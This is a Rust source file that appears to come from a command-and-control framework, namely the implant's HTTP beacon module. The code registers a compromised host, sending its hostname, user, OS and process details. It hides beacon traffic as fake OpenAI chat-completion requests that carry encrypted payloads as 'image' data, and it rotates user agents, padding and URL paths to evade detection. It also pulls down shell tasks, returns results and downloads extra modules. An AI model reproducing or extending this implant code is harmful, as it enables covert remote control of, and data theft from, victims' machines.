//!
//!

use libra_common::models::AgentTask;
use libra_common::models::ProfileTransform;
use rand::Rng;
use reqwest::Client;
use serde_json::Value;

const AES_KEY_SIZE: usize = 32;

/// Result of a successful registration, including the transform profile the
/// server wants the agent to use for subsequent requests.
pub struct RegisterOutcome {
    pub agent_id: String,
    pub session_key: Option<Vec<u8>>,
    pub profile: Option<ProfileTransform>,
    pub session_token: Option<String>,
    pub server_public_key: String,
    pub heartbeat_interval_ms: u64,
    pub jitter_percent: f64,
}

/// HTTP communicator for beacon-style communication with the C2 server.
pub struct HttpCommunicator {
    client: Client,
    server_url: String,
    entry_path: String,
    profile: Option<ProfileTransform>,
    session_token: Option<String>,
    server_public_key: String,
    beacon_secret: String,
    ua_index: std::sync::atomic::AtomicUsize,
}

impl HttpCommunicator {
    pub fn new(
        server_url: &str,
        register_path: &str,
        _heartbeat_path: &str,
        _result_path: &str,
    ) -> Self {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .unwrap_or_else(|e| {
                libra_common::dlog!("[http] Failed to create HTTP client, using default: {}", e);
                Client::new()
            });

        Self {
            client,
            server_url: server_url.to_string(),
            entry_path: register_path.to_string(),
            profile: None,
            session_token: None,
            server_public_key: String::new(),
            beacon_secret: String::new(),
            ua_index: std::sync::atomic::AtomicUsize::new(0),
        }
    }

    /// Adopt the per-session channel token issued at registration.
    pub fn set_session_token(&mut self, token: String) {
        self.session_token = Some(token);
    }

    /// Adopt the traffic-shaping profile issued at registration.
    pub fn set_profile(&mut self, profile: ProfileTransform) {
        if !profile.entry_path.is_empty() {
            self.entry_path = profile.entry_path.clone();
        }
        self.profile = Some(profile);
    }

    pub fn set_server_public_key(&mut self, key: String) {
        self.server_public_key = key;
    }

    pub fn set_build_style(
        &mut self,
        user_agents: Vec<String>,
        extra_headers: Vec<String>,
        path_suffixes: Vec<String>,
    ) {
        let p = self.profile.get_or_insert_with(Default::default);
        if !user_agents.is_empty() {
            p.user_agents = user_agents;
        }
        if !path_suffixes.is_empty() {
            p.path_suffixes = path_suffixes;
        }
        p.extra_headers = extra_headers;
    }

    fn apply_extra_headers(&self, req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
        let mut req = req;
        if let Some(p) = self.profile.as_ref() {
            for h in &p.extra_headers {
                if let Some((name, value)) = h.split_once(':') {
                    let name = name.trim();
                    let value = value.trim();
                    if !name.is_empty() && !value.is_empty() {
                        req = req.header(name, value);
                    }
                }
            }
        }
        req
    }

    fn register_url(&self) -> String {
        format!("{}{}", self.server_url, self.entry_path)
    }

    fn entry_url(&self) -> String {
        let suffix = self
            .profile
            .as_ref()
            .and_then(|p| {
                if p.path_suffixes.is_empty() {
                    None
                } else {
                    let idx = rand::thread_rng().gen_range(0..p.path_suffixes.len());
                    Some(p.path_suffixes[idx].as_str())
                }
            })
            .unwrap_or("");
        if suffix.is_empty() {
            format!("{}{}", self.server_url, self.entry_path)
        } else {
            format!(
                "{}{}/{}",
                self.server_url,
                self.entry_path.trim_end_matches('/'),
                suffix
            )
        }
    }

    fn pick_user_agent(&self) -> Option<String> {
        let p = self.profile.as_ref()?;
        if p.user_agents.is_empty() {
            return None;
        }
        let idx = self
            .ua_index
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        Some(p.user_agents[idx % p.user_agents.len()].clone())
    }

    fn pad_and_encrypt(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
        let (pmin, pmax) = self
            .profile
            .as_ref()
            .map(|p| {
                (
                    p.padding_min as usize,
                    (p.padding_max as usize).max(p.padding_min as usize),
                )
            })
            .unwrap_or((0, 0));
        let pad_len = if pmax > 0 {
            rand::thread_rng().gen_range(pmin..=pmax)
        } else {
            0
        };
        let padded = format!("{}{}", inner_plain, "\n".repeat(pad_len));
        libra_crypto::encrypt_payload(&padded, key)
    }

    fn build_body(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
        let cipher_b64 = self.pad_and_encrypt(inner_plain, key);

        let (dk, tk, rk, sk, sidk) = self
            .profile
            .as_ref()
            .map(|p| {
                (
                    p.data_key.as_str(),
                    p.ts_key.as_str(),
                    p.rand_key.as_str(),
                    p.sign_key.as_str(),
                    p.token_key.as_str(),
                )
            })
            .unwrap_or(("d", "ts", "r", "", "sid"));

        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis();
        let rand_hex: String = {
            let mut b = [0u8; 4];
            rand::thread_rng().fill(&mut b);
            b.iter().map(|x| format!("{x:02x}")).collect()
        };
        let token = self.session_token.clone().unwrap_or_default();

        let sign = if !sk.is_empty() && !self.beacon_secret.is_empty() {
            Some(hmac_sign(
                &self.beacon_secret,
                &format!("{ts}|{cipher_b64}"),
            ))
        } else {
            None
        };

        let with_token = format!(r#","{}":"{}""#, sidk, token);
        let token_part = if token.is_empty() {
            String::new()
        } else {
            with_token
        };

        match sign {
            Some(s) => format!(
                r#"{{"{}":"{}","{}":{},"{}":"{}","{}":"{}"{}}}"#,
                dk, cipher_b64, tk, ts, rk, rand_hex, sk, s, token_part
            ),
            None => format!(
                r#"{{"{}":"{}","{}":{},"{}":"{}"{}}}"#,
                dk, cipher_b64, tk, ts, rk, rand_hex, token_part
            ),
        }
    }

    async fn post_envelope(&self, body: String) -> Result<(u16, String), String> {
        let mut req = self.client.post(self.entry_url()).body(body);
        if let Some(ua) = self.pick_user_agent() {
            req = req.header(reqwest::header::USER_AGENT, ua);
        }
        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let text = resp.text().await.map_err(|e| e.to_string())?;
        Ok((status, text))
    }

    ///
    ///   POST /v1/chat/completions
    async fn post_ai(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> Result<String, String> {
        let (ai_path, models, auth_prefix) = self
            .profile
            .as_ref()
            .map(|p| {
                (
                    p.ai_path.as_str(),
                    p.ai_models.as_slice(),
                    p.auth_prefix.as_str(),
                )
            })
            .unwrap_or(("/v1/chat/completions", &[][..], "sk-"));

        let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
        let content = format!("data:image/jpeg;base64,{}", cipher_b64);
        let model = if models.is_empty() {
            "gpt-4o-mini"
        } else {
            models[rand::thread_rng().gen_range(0..models.len())].as_str()
        };
        let body = serde_json::json!({
            "model": model,
            "stream": true,
            "messages": [{"role": "user", "content": content}],
            "user": self.session_token.clone().unwrap_or_default()
        });

        let auth: String = {
            let mut b = [0u8; 24];
            rand::thread_rng().fill(&mut b);
            format!(
                "Bearer {}{}",
                auth_prefix,
                b.iter().map(|x| format!("{x:02x}")).collect::<String>()
            )
        };

        let url = format!("{}{}", self.server_url, ai_path);
        let mut req = self
            .client
            .post(&url)
            .header("Content-Type", "application/json")
            .header("Authorization", auth)
            .body(body.to_string());
        if let Some(ua) = self.pick_user_agent() {
            req = req.header(reqwest::header::USER_AGENT, ua);
        }
        req = self.apply_extra_headers(req);

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let text = resp.text().await.map_err(|e| e.to_string())?;
        // 401 = session lost; 404 = channel/path mismatch (server profile or
        // builder server_url drift) — re-register to fetch a fresh profile.
        if status == 401 || status == 404 {
            return Err("SESSION_LOST".to_string());
        }
        if status != 200 {
            return Err(format!("AI channel request failed: {status}"));
        }

        let mut cipher = String::new();
        for line in text.lines() {
            let line = line.trim();
            let data = match line.strip_prefix("data:") {
                Some(d) => d.trim(),
                None => continue,
            };
            if data == "[DONE]" {
                break;
            }
            if let Ok(v) = serde_json::from_str::<Value>(data) {
                if let Some(content) = v["choices"][0]["delta"]["content"].as_str() {
                    cipher.push_str(content);
                }
            }
        }
        if cipher.is_empty() {
            return Err("empty AI channel response".to_string());
        }
        libra_crypto::decrypt_payload(&cipher, key)
    }

    pub async fn open_events(
        &self,
        _key: &[u8; AES_KEY_SIZE],
    ) -> Result<reqwest::Response, String> {
        let token = self.session_token.clone().unwrap_or_default();
        // Token travels in a header, not the URL query string: query params end
        // up in server/proxy access logs, a session-token leak.
        let url = format!("{}{}", self.server_url, "/api/v1/models/events");
        let mut req = self
            .client
            .get(&url)
            .header("Accept", "text/event-stream")
            .header("X-Session-Token", token);
        if let Some(ua) = self.pick_user_agent() {
            req = req.header(reqwest::header::USER_AGENT, ua);
        }
        req = self.apply_extra_headers(req);

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        if status == 401 || status == 404 {
            return Err("SESSION_LOST".to_string());
        }
        if status != 200 {
            return Err(format!("events request failed: {status}"));
        }
        Ok(resp)
    }

    pub async fn register(
        &mut self,
        hostname: &str,
        user_name: &str,
        os_version: &str,
        arch: &str,
        public_key: &str,
        beacon_secret: &str,
        hardware_json: &str,
        has_session_key: bool,
        heartbeat_interval_ms: u64,
    ) -> Result<RegisterOutcome, String> {
        let pid = std::process::id();
        let hw = if hardware_json.is_empty() || hardware_json == "null" {
            "null"
        } else {
            hardware_json
        };
        self.beacon_secret = beacon_secret.to_string();

        let reg_json = format!(
            r#"{{"hostname":"{}","userName":"{}","osVersion":"{}","arch":"{}","processName":"agent","pid":{},"isElevated":false,"publicKey":"{}","beaconSecret":"{}","hardware":{},"hasSessionKey":{},"heartbeatIntervalMs":{}}}"#,
            escape(hostname),
            escape(user_name),
            escape(os_version),
            escape(arch),
            pid,
            escape(public_key),
            escape(beacon_secret),
            hw,
            if has_session_key { "true" } else { "false" },
            heartbeat_interval_ms
        );

        let (status, resp_body) = if !self.server_public_key.is_empty() {
            let (enc_key, cipher_body) =
                libra_crypto::hybrid_encrypt(&reg_json, &self.server_public_key)
                    .map_err(|e| format!("hybrid encrypt: {e}"))?;
            let body = format!(
                r#"{{"grant_type":"client_credentials","client_id":"{}","client_secret":"{}"}}"#,
                cipher_body, enc_key
            );
            let resp = self
                .client
                .post(format!("{}{}", self.server_url, "/api/v1/session"))
                .header("Content-Type", "application/json")
                .body(body)
                .send()
                .await
                .map_err(|e| e.to_string())?;
            let status = resp.status().as_u16();
            let text = resp.text().await.map_err(|e| e.to_string())?;
            (status, text)
        } else if beacon_secret.is_empty() {
            let resp = self
                .client
                .post(self.register_url())
                .header("Content-Type", "application/json")
                .body(reg_json.clone())
                .send()
                .await
                .map_err(|e| e.to_string())?;
            let status = resp.status().as_u16();
            let text = resp.text().await.map_err(|e| e.to_string())?;
            (status, text)
        } else {
            let pre_key = libra_crypto::derive_pre_session_key(beacon_secret);
            let envelope =
                serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
            let body = self.build_body(&envelope, &pre_key);
            self.post_envelope(body).await?
        };
        if status != 200 {
            return Err(format!("Registration failed with status: {status}"));
        }

        let v: Value =
            serde_json::from_str(&resp_body).map_err(|e| format!("bad register response: {e}"))?;

        let agent_id = v
            .get("agent_id")
            .and_then(|s| s.as_str())
            .ok_or("agent_id not found in response")?
            .to_string();

        let session_key = v
            .get("session_key")
            .and_then(|s| s.as_str())
            .filter(|s| !s.is_empty())
            .and_then(|s| {
                use base64::Engine as _;
                base64::engine::general_purpose::STANDARD.decode(s).ok()
            });

        let session_token = v
            .get("session_token")
            .and_then(|s| s.as_str())
            .map(|s| s.to_string());
        if let Some(t) = &session_token {
            self.session_token = Some(t.clone());
        }

        let profile: Option<ProfileTransform> = v
            .get("profile")
            .and_then(|p| serde_json::from_value(p.clone()).ok());
        if let Some(p) = &profile {
            self.set_profile(p.clone());
        }

        let heartbeat_interval_ms = v
            .get("heartbeat_interval_ms")
            .and_then(|n| n.as_u64())
            .unwrap_or(0);
        let jitter_percent = v
            .get("jitter_percent")
            .and_then(|n| n.as_f64())
            .unwrap_or(0.0);

        Ok(RegisterOutcome {
            agent_id,
            session_key,
            profile,
            session_token,
            server_public_key: self.server_public_key.clone(),
            heartbeat_interval_ms,
            jitter_percent,
        })
    }

    pub async fn heartbeat(
        &self,
        _agent_id: &str,
        session_key: Option<&[u8; AES_KEY_SIZE]>,
    ) -> Result<Option<AgentTask>, String> {
        let key = session_key.ok_or("no session key")?;
        let token = self.session_token.clone().unwrap_or_default();

        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as i64;
        let inner =
            serde_json::json!({ "op": "hb", "id": token, "data": format!(r#"{{"ts":{}}}"#, ts) })
                .to_string();

        let plain = self.post_ai(&inner, key).await?;
        let v: Value =
            serde_json::from_str(&plain).map_err(|e| format!("bad heartbeat payload: {e}"))?;

        let task = match v.get("pendingTask") {
            Some(task_val) if !task_val.is_null() => {
                let task_json =
                    serde_json::to_string(task_val).map_err(|e| format!("task serialize: {e}"))?;
                Some(parse_task(&task_json))
            }
            _ => None,
        };
        Ok(task)
    }

    pub async fn submit_result(
        &self,
        _agent_id: &str,
        result_json: &str,
        session_key: Option<&[u8; AES_KEY_SIZE]>,
    ) -> Result<(), String> {
        let key = session_key.ok_or("no session key")?;
        let token = self.session_token.clone().unwrap_or_default();

        let inner =
            serde_json::json!({ "op": "res", "id": token, "data": result_json }).to_string();
        self.post_ai(&inner, key).await?;
        Ok(())
    }

    pub async fn download_module(
        &self,
        name: &str,
        _agent_id: &str,
        session_key: &[u8; AES_KEY_SIZE],
    ) -> Result<Vec<u8>, String> {
        let token = self.session_token.clone().unwrap_or_default();
        let inner = serde_json::json!({ "op": "mod", "id": token, "data": format!(r#"{{"name":"{}"}}"#, escape(name)) })
            .to_string();

        let plain = self.post_ai(&inner, session_key).await?;
        use base64::Engine as _;
        base64::engine::general_purpose::STANDARD
            .decode(plain.trim())
            .map_err(|e| format!("module payload decode: {e}"))
    }
}

// ── JSON extraction helpers ──────────────────────────────────────────

fn escape(s: &str) -> String {
    libra_common::json_util::escape_json(s)
}

fn hmac_sign(secret: &str, msg: &str) -> String {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;
    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).expect("hmac key");
    mac.update(msg.as_bytes());
    let digest = mac.finalize().into_bytes();
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

fn parse_task(json: &str) -> AgentTask {
    match serde_json::from_str::<AgentTask>(json) {
        Ok(task) => task,
        Err(_) => {
            // Fallback: parse from Value for partial compatibility
            let v: serde_json::Value =
                serde_json::from_str(json).unwrap_or(serde_json::Value::Null);
            use libra_common::models::{CommandType, TaskStatus};
            AgentTask {
                id: v["id"].as_str().unwrap_or_default().to_string(),
                agent_id: v["agentId"].as_str().unwrap_or_default().to_string(),
                created_by: v["createdBy"].as_str().unwrap_or_default().to_string(),
                command: v["command"].as_str().unwrap_or_default().to_string(),
                command_type: v["commandType"]
                    .as_str()
                    .and_then(|s| serde_json::from_str::<CommandType>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(CommandType::Shell),
                arguments: Vec::new(),
                status: v["status"]
                    .as_str()
                    .and_then(|s| serde_json::from_str::<TaskStatus>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(TaskStatus::Pending),
                output: v["output"].as_str().map(|s| s.to_string()),
                error: v["error"].as_str().map(|s| s.to_string()),
                timeout_seconds: v["timeoutSeconds"].as_i64().unwrap_or(60) as i32,
            }
        }
    }
}
